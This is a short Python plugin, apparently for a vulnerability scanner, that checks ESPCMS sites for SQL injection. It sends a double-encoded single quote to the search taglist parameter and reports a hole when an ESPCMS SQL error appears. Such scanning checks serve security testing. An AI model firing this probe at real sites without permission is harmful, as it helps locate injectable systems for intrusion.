#!/usr/bin/env python
# http://www.cnseay.com/archives/2383

def assign(service, arg):
    if service == "espcms":
        return True, arg

def audit(arg):
    url = arg
    code, _, res, _, _ = curl.curl(url + 'index.php?ac=search&at=taglist&tagkey=a%2527')
    if code == 200 and res.find('ESPCMS SQL Error:') != -1:
        security_hole(url)


        return arg
if __name__== '__main__':
    from dummy import *
